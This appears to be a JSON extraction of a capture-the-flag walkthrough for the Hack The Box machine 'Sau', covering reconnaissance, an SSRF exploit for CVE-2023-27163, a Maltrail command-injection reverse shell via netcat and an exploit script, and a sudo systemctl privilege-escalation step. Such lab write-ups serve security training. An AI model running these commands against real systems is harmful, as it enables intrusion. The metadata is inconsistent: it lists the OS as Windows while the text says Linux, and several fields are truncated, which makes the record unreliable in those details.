@@ -1,0 +1,78 @@
+{
+  "machine": {
+    "machine_name": "Sau",
+    "target_ip": "10.129.229.26",
+    "description": "`Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery (SSRF) via `[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)`. Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.",
+    "vulnerabilities": [
+      "OS Command Injection Server Side Request Forgery (SSRF)"
+    ],
+    "tools": [
+      "Netcat Nmap"
+    ],
+    "techniques": [
+      "Reconnaissance SUDO Exploitation"
+    ],
+    "os": "windows",
+    "cves": [
+      "CVE-2023-27163",
+      "CVE-2023-26604"
+    ]
+  },
+  "sections": [
+    {
+      "title": "Task 0 - Deploy machine",
+      "content": "\n🎯 Target IP: `10.129.229.26`\n\nCreate a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.\n",
+      "commands": []
+    },
+    {
+      "title": "Task 1 - Reconnaissance",
+      "content": "\n<pre class=\"language-bash\"><code class=\"lang-bash\">su\n<strong>echo \"10.129.229.26 sau.htb\" >> /etc/hosts\n</strong>\nmkdir -p htb/sau.htb\ncd htb/sau.htb\nmkdir {nmap,content,exploits,scripts}\n# At the end of the room\n# To clean up the last line from the /etc/hosts file\n<strong>sed -i '$ d' /etc/hosts\n</strong></code></pre>\n\nI prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.\n\n```bash\nping -c 3 sau.htb\nPING sau.htb (10.129.229.26) 56(84) bytes of data.\n64 bytes from sau.htb (10.129.229.26): icmp_seq=1 ttl=63 time=61.0 ms\n64 bytes from sau.htb (10.129.229.26): icmp_seq=2 ttl=63 time=59.5 ms\n64 bytes from sau.htb (10.129.229.26): icmp_seq=3 ttl=63 time=60.0 ms\n```\n\nSending these three ICMP packets, we see that the Time To Live (TTL) is \\~64 secs. this indicates that the target should be a \\*nix system, while Windows systems usually have a TTL of 128 secs.\n\n### 1.1 - Which is the highest open TCP port on the target machine?\n\n```bash\nnmap -p0- ",
+      "commands": [
+        "ping -c 3 sau.htb",
+        "PING sau.htb (10.129.229.26) 56(84) bytes of data.",
+        "64 bytes from sau.htb (10.129.229.26): icmp_seq=1 ttl=63 time=61.0 ms",
+        "64 bytes from sau.htb (10.129.229.26): icmp_seq=2 ttl=63 time=59.5 ms",
+        "64 bytes from sau.htb (10.129.229.26): icmp_seq=3 ttl=63 time=60.0 ms",
+        "nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan",
+        "22/tcp    open     ssh     syn-ack ttl 63",
+        "80/tcp    filtered http    no-response",
+        "8338/tcp  filtered unknown no-response",
+        "55555/tcp open     unknown syn-ack ttl 63",
+        "nmap -p22,55555 -sS -Pn -n -v -sCV -T4 sau.htb -oN nmap/service_port_scan",
+        "22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)",
+        "55555/tcp open  unknown",
+        "whatweb sau.htb:55555",
+        "http://sau.htb:55555 [302 Found] Country[RESERVED][ZZ], IP[10.129.229.26], RedirectLocation[/web]",
+        "http://sau.htb:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.129.229.26], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]",
+        "gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt",
+        "echo \"10.129.229.26 sau.htb\" >> /etc/hosts",
+        "mkdir -p htb/sau.htb",
+        "cd htb/sau.htb",
+        "mkdir {nmap,content,exploits,scripts}",
+        "# At the end of the room",
+        "# To clean up the last line from the /etc/hosts file",
+        "sed -i '$ d' /etc/hosts"
+      ]
+    },
+    {
+      "title": "Task 2 - Find user flag",
+      "content": "\n### 2.1 -  What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?\n\nGoogling 'request-baskets 1.2.1' we discover that's vulnerable to a recent CVE via an [SSRF](https://portswigger.net/web-security/ssrf) attack.\n\n{% embed url=\"https://nvd.nist.gov/vuln/detail/CVE-2023-27163\" %}\n\n{% embed url=\"https://github.com/entr0pie/CVE-2023-27163\" %}\n\n{% hint style=\"info\" %}\nCVE-2023-27163\n{% endhint %}\n\nAfter understanding [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and reading details regarding usage:\n\n<figure><img src=\"../.gitbook/assets/image (350).png\" alt=\"\"><figcaption></figcaption></figure>\n\nwe can download CVE-2023-27163.sh and execute it exploiting our vulnerability:\n\n```bash\nwget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh\nchmod +x CVE-2023-27163.sh\n./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80\n```\n\n<figure><img src=\"../.gitbook/assets/image (355).png\" alt=\"\"><figcap",
+      "commands": [
+        "wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh",
+        "chmod +x CVE-2023-27163.sh",
+        "./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80",
+        "nc -nvlp 4444",
+        "python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml",
+        "cd ~",
+        "cat user.txt"
+      ]
+    },
+    {
+      "title": "Task 3 - Find root flag",
+      "content": "\n### 3.1 - What is the full path to the application the user puma can run as root on Sau?\n\nVery good, we can proceed with privilege escalation for obtaining the root flag.\n\nExecuting `sudo -l` command we can commands that user puma can execute with sudo privileges\n\n<figure><img src=\"../.gitbook/assets/image (359).png\" alt=\"\"><figcaption></figcaption></figure>\n\n{% hint style=\"info\" %}\n/usr/bin/systemctl\n{% endhint %}\n\n### 3.2 - What is the full version string for the instance of systemd installed on Sau?\n\nWe know that systemctl is a service associated at process systemd, we can search version digiting: `systemctl --version`\n\n<figure><img src=\"../.gitbook/assets/image (361).png\" alt=\"\"><figcaption></figcaption></figure>\n\n{% hint style=\"info\" %}\nsystemd 245 (245.4-4ubuntu3.22)\n{% endhint %}\n\n### 3.3 - What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?\n\nGoogling 'usr/bin/systemctl status trail.service', we discover this CVE:\n\n{% ",
+      "commands": []
+    }
+  ],
+  "total_commands": 31,
+  "extracted_at": "2026-02-15T17:13:31.963888+00:00"
+}
